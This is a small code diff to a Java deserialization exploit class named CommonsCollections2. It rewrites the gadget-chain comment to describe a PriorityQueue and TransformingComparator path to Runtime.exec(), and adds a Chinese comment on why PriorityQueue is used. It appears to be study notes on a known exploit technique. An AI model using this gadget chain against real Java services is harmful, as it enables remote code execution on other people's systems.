@@ -17,17 +17,13 @@ import java.util.PriorityQueue;
 
 /*
 	Gadget chain:
-	    java.io.ObjectInputStream.readObject()
-            java.util.HashSet.readObject()
-                java.util.HashMap.put()
-                java.util.HashMap.hash()
-                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
-                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
-                        org.apache.commons.collections.map.LazyMap.get()
-                            org.apache.commons.collections.functors.ChainedTransformer.transform()
-                            org.apache.commons.collections.functors.InvokerTransformer.transform()
-                            java.lang.reflect.Method.invoke()
-                                java.lang.Runtime.exec()
+		ObjectInputStream.readObject()
+			PriorityQueue.readObject()
+				...
+					TransformingComparator.compare()
+						InvokerTransformer.transform()
+							Method.invoke()
+								Runtime.exec()
  */
 public class CommonsCollections2 {
     // jdk8u71以及之后的版本使用
@@ -51,6 +47,7 @@ public class CommonsCollections2 {
         };
 
         TransformingComparator comparator = new TransformingComparator(transformerChain);
+        // 使用PriorityQueue是因为有比较操作 可以使用自定义的comparater
         PriorityQueue priorityQueue = new PriorityQueue(2, comparator);
         priorityQueue.offer(1);
         priorityQueue.offer(2); //两个元素执行调整堆大小的操作
